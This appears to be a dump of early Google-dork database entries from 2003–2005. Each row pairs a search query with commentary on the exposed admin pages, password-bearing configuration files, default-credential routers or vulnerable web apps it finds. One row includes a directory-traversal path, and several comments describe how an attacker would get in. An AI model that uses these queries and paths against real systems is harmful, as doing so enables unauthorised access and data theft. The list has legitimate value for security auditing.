&quot;1&quot;;&quot;2003-06-24&quot;;&quot;"cacheserverreport for" "This analysis was produced by calamaris"&quot;;&quot;These are squid server cache reports. Fairly benign, really except when you consider using them for evil purposes. For example, an institution stands up a proxy server for their internal users to get to the outside world. Then, the internal user surf all over to their hearts content (including intranet pages cuz well, the admins are stupid) Voila, intranet links show up in the external cache report. Want to make matters worse for yourself as an admin? OK, configure your external proxy server as a trusted internal host. Load up your web browser, set your proxy as their proxy and surf your way into their intranet. Not that I&#039;ve noticed any examples of this in this google list. *COUGH* *COUGH* *COUGH*  unresolved DNS lookups give clues *COUGH* *COUGH* (&#039;scuse me. must be a furball) OK, lets say BEST CASE scenario. Let&#039;s say there&#039;s not security problems revealed in these logs. Best case scenario is that outsiders can see what your company/agency/workers are surfing.&quot;
&quot;780&quot;;&quot;2004-12-19&quot;;&quot;ext:php intext:"Powered by phpNewMan Version"&quot;;&quot;PHP News Manager is a multi-platform compatible solution for managing websites and multi-user access. Features weekly poll management, gallery management, partners list management, public news support, and a lot more. PHP News Manager is vulnerable to a directory traversal problem. path/to/news/browse.php?clang=../../../../../../file/i/want&quot;
&quot;781&quot;;&quot;2004-12-19&quot;;&quot;intitle:"Cayman-DSL.home"&quot;;&quot;Cayman DSL modems. Many Cayman units have a weakness where even if remote administration is disabled, some older firmwares will still allow validation if proper login credentials are supplied. In many cases, simply hitting enter will be enough to authenticate. It&#039;s worth noting, many of the vulnerable devices also support telnet right out of the box, as opposed to the linksys models which require a firmware patch.&quot;
&quot;782&quot;;&quot;2004-12-19&quot;;&quot;intitle:"Index of /CFIDE/" administrator&quot;;&quot;With ColdFusion, you can build and deploy powerful web applications and web services with far less training time and fewer lines of code than ASP, PHP, and JSP.The search that pulls up directory listings we probably shouldn&#039;t be seeing.. entering the &#039;administrator&#039; directory brings up a ColdFusion login screen&quot;
&quot;783&quot;;&quot;2004-12-19&quot;;&quot;intitle:"Athens Authentication Point"&quot;;&quot;Athens is an Access Management system for controlling access to web based subscription services. It offers:    * secure single username access to multiple web-based access controlled services    * devolved administration facilities at organisation level    * remote access user accounts    * encrypted account bulk upload facilities    * scalable services with 3 million accounts    * replication facilities at several separate physical locations, offering a resilient authentication service&quot;
&quot;784&quot;;&quot;2004-12-19&quot;;&quot;ext:ini eudora.ini&quot;;&quot;Well, this is the configuration file for Eudora...may contain sensitive information like pop servers, logins and encypted passwords sometimes.&quot;
&quot;785&quot;;&quot;2004-12-19&quot;;&quot;inurl:preferences.ini "[emule]"&quot;;&quot;This finds the emule configuration file which contains some general and proxy information.Sometimes proxy user and password are stored.&quot;
&quot;786&quot;;&quot;2004-12-19&quot;;&quot;intitle:index.of abyss.conf&quot;;&quot;These directories reveal the configuration file of the abyss webserver. These files can contain passwords.&quot;
&quot;787&quot;;&quot;2004-12-19&quot;;&quot;intitle:Login intext:"RT is ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â© Copyright"&quot;;&quot;RT is an enterprise-grade ticketing system which enables a group of people to intelligently and efficiently manage tasks, issues, and requests submitted by a community of users.Versions including 2.0.13 are vulnerable to injection, check outSecurityFocus BID 7509&quot;
&quot;788&quot;;&quot;2004-12-19&quot;;&quot;intext:""BiTBOARD v2.0" BiTSHiFTERS Bulletin Board"&quot;;&quot;The bitboard2 is a board that need no database to work. So it is useful for webmaster that have no access to a sql database. The password file can be retrieve from/admin/data_passwd.dat&quot;
&quot;789&quot;;&quot;2004-12-19&quot;;&quot;intitle:"welcome.to.squeezebox"&quot;;&quot;squeezebox is the easiest way for music lovers to enjoy high-quality playback of their whole digital music collection. Stream music from your computer to anywhere in your home. Works with iTunes and provides a powerful web interface for control from any computer on your network.This is neat, on top of giving out all sorts of enumeration information, it also allows one to paruse the music collection on the box, as well as listen if you install the aplet. Way cool.&quot;
&quot;790&quot;;&quot;2004-12-29&quot;;&quot;allinurl:"/*/_vti_pvt/" | allinurl:"/*/_vti_cnf/"&quot;;&quot;Frontpage extensions for Unix ? So be it..&quot;
&quot;792&quot;;&quot;2004-12-30&quot;;&quot;filetype:cnf inurl:_vti_pvt access.cnf&quot;;&quot;The access.cnf file is a "weconfigfile" (webconfig file) used by Frontpage Extentions for Unix. The install script called change_server.sh processes them. These files leak information about the realm name and the full path on the server for it.&quot;
&quot;793&quot;;&quot;2004-12-29&quot;;&quot;inurl:"install/install.php"&quot;;&quot;This searches for the install.php file. Most results will be a Bulletin board like  Phpbb etc.This will let an attacker install the forum again. There is an exploit available on the Net which lets you see DB info.&quot;
&quot;794&quot;;&quot;2004-12-30&quot;;&quot;intitle:"index of" inurl:ftp (pub | incoming)&quot;;&quot;Adding "inurl:ftp (pub | incoming)" to the "index.of" searches helps locating ftp websites. This query can easily be narrowed further with additional keywords.&quot;
&quot;795&quot;;&quot;2004-12-30&quot;;&quot;filetype:blt "buddylist"&quot;;&quot;AIM buddylists.&quot;
&quot;797&quot;;&quot;2004-12-30&quot;;&quot;intitle:"Sipura.SPA.Configuration" -.pdf&quot;;&quot;Query returns configuration pages for online Voice over IP devices. Discloses an obscene amount of information about the target, including most all routing information and access to control user&#039;s telephone system.&quot;
&quot;798&quot;;&quot;2004-12-30&quot;;&quot;intitle:"Azureus : Java BitTorrent Client Tracker"&quot;;&quot;This query shows machines using the Azureus BitTorrent client&#039;s built-in tracker - the pages are quite simple in the information they give out, simply a list of active torrents.This information may be useful for people wanting to find active BitTorrent trackers for downloading .torrent files from, or for people wanting to find these trackers to shut them down :)&quot;
&quot;799&quot;;&quot;2004-12-30&quot;;&quot;intitle:"BNBT Tracker Info"&quot;;&quot;This query shows pages which summarise activity on BNBT-powered BitTorrent trackers - including all the torrents currently being "tracked", the BNBT software version, links to user-lists and &#039;admin&#039; pages, etc.This is useful to people who want to find active BitTorrent trackers for downloading - including ones which aren&#039;t &#039;public&#039;. It is also useful for people wanting to gain some clues into a tracker&#039;s/site&#039;s setup. Some versions of BNBT are also vulnerable to a DOS attack. People targetting BitTorrent trackers because of the questionable legality of their general usage may also find this query useful!&quot;
&quot;800&quot;;&quot;2004-12-30&quot;;&quot;intitle:"PHPBTTracker Statistics" | intitle:"PHPBT Tracker Statistics"&quot;;&quot;This query shows pages which summarise activity on PHPBT-powered BitTorrent trackers - all the torrents currently being "tracked".This is useful to people who want to find active BitTorrent trackers for downloading - including ones which aren&#039;t &#039;public&#039;. It is also useful for people wanting to gain some clues into a tracker&#039;s/site&#039;s setup. People targetting BitTorrent trackers because of the questionable legality of their general usage may also find this query useful!Often, the URL involved can be changed to access the configuration / installation / deletion script.. which are obviously *not* intended for public access, even if the statistics page is.&quot;
&quot;801&quot;;&quot;2005-01-02&quot;;&quot;"Powered by WordPress" -html filetype:php -demo -wordpress.org -bugtraq&quot;;&quot;Query: "Powered by WordPress" -html filetype:php -demo -wordpress.org -bugtraqBackground: WordPress is a blogging software which is vulnerable to a few SQL injection queries.http://securityfocus.com/bid/12066/exploit/&quot;
&quot;802&quot;;&quot;2005-01-01&quot;;&quot;intitle:upload inurl:upload intext:upload -forum -shop -support -w3c&quot;;&quot;The search reveals server upload portals.An attacker can use server space for his own benefit.&quot;
&quot;803&quot;;&quot;2005-01-08&quot;;&quot;intitle:"SpeedStream * Management Interface"&quot;;&quot;a lot of Speed stream routers :)&quot;
&quot;804&quot;;&quot;2005-01-05&quot;;&quot;intitle:"HFS /" +"HttpFileServer"&quot;;&quot;"The HttpFileServer is a Java based mechanism for providing web access to a set of files on a server. This is very similar to Apache Directory Indexing but provides the ability to upload files as well." http://johnny.ihackstuff.com/index.php?name=PNphpBB2&file=viewtopic&t=1516&quot;
&quot;805&quot;;&quot;2004-12-30&quot;;&quot;inurl:"next_file=main_fs.htm" inurl:img inurl:image.cgi&quot;;&quot;Linksys Wireless-G web cams.&quot;
&quot;806&quot;;&quot;2004-12-27&quot;;&quot;"There are no Administrators Accounts" inurl:admin.php -mysql_fetch_row&quot;;&quot;This is a more specific search for the vulnerable PhpNuke index already seen on this website.PhpNuke asks you to set up an admin account when it is first installed. This search is a list of people who never set up that account! It will take you directly to the administrator registration of a vulnerable server. The -mysql_fetch_row will remove listings where SQL is simply broken.&quot;
&quot;807&quot;;&quot;2005-01-02&quot;;&quot;filetype:ctt Contact&quot;;&quot;This is for MSN Contact lists...&quot;
&quot;808&quot;;&quot;2005-01-02&quot;;&quot;filetype:ctt "msn"&quot;;&quot;This will give msn contact lists .. modify the "msn" to what ever you feel is messenger related&quot;
&quot;809&quot;;&quot;2005-01-06&quot;;&quot;inurl:servlet/webacc&quot;;&quot;I was playing around on the net when I found a small problem with Novell&#039;s WebAcces. With User.lang you can give in you&#039;re language as parameter I tried some different stuff there and when I tried so that the URL would be hxxp://www.notsohappyserver.com/servlet/webacc?User.Lang="> this link appeared I clicked it and so I found unprotected dirs.In hxxp://www.notsohappyserver.com/com/novell/webaccess/ is a file called WebAccessUninstall.ini and this file contains info like servernames installationpaths and servers context&quot;
&quot;810&quot;;&quot;2005-01-07&quot;;&quot;"Web File Browser" "Use regular expression"&quot;;&quot;This will ask google to search for a php script used to manage files on a server. The script "Web File Browser" enables users to change files on the server. The script comes un-protected, which means that anyone who knows the exact path of the php file can have admin access to files on that server.&quot;
&quot;811&quot;;&quot;2005-01-02&quot;;&quot;intext:gmail invite intext:http://gmail.google.com/gmail/a&quot;;&quot;This is a dork I did today. At first, I wanted to find out the formula for making one, but ... It got boring, so I just made a dork that finds invites. If you want to get specific, try adding "+blog", "+livejournal", or , "+forum".&quot;
&quot;812&quot;;&quot;2005-01-11&quot;;&quot;filetype:cgi transcoder.cgi&quot;;&quot;Digital Video Recorder by SnapStream. It is possible on misconfigured machines to stream video off these devices.&quot;
&quot;813&quot;;&quot;2005-01-10&quot;;&quot;intitle:"Setup Home" "You will need * log in before * * change * settings"&quot;;&quot;This should reveal Belkin routers. Interestingly, Belkin routers by default have remote administration on, and act as a webserver for administration. Also by default, their password is blank (and the login page helpfuly informs the attacker of this).Once he&#039;s in, there&#039;s all kinds of annoying stuff he could get into, and it could also be used more blackhackishly to disable security.&quot;
&quot;814&quot;;&quot;2005-01-09&quot;;&quot;"Index of" rar r01 nfo Modified 2004&quot;;&quot;New Warez Directory Lists&quot;
&quot;815&quot;;&quot;2005-01-12&quot;;&quot;intitle:"Network Print Server" filetype:shtm ( inurl:u_printjobs | inurl:u_server | inurl:a_server | inurl:u_generalhelp | u_printjobs )&quot;;&quot;Axis Network Print Server devices. This search has all the possible urls (more than strictly needed), but those are added in case Google decides to index them in the future.&quot;
&quot;816&quot;;&quot;2005-01-12&quot;;&quot;intitle:"Network Print Server" intext:"http://www.axis.com" filetype:shtm&quot;;&quot;Axis Network Print Server devices (a better shorter search).&quot;
&quot;817&quot;;&quot;2005-01-15&quot;;&quot;"pcANYWHERE EXPRESS Java Client"&quot;;&quot;This search will reveal the java script program that allows someone to access PC Anywhere from, well, anywhere! This should primarily be considered as a frontdoor, as most PC Anywhere servers are password protected. Still this is extremely dangerous to have exposed to the web.&quot;
&quot;818&quot;;&quot;2005-01-15&quot;;&quot;inurl:"Activex/default.htm" "Demo"&quot;;&quot;This search will reveal the active X plugin page that allows someone to access PC Anywhere from, well, anywhere! This should primarily be considered as a frontdoor, as most PC Anywhere servers are password protected. Still this is extremely dangerous to have exposed to the web.&quot;
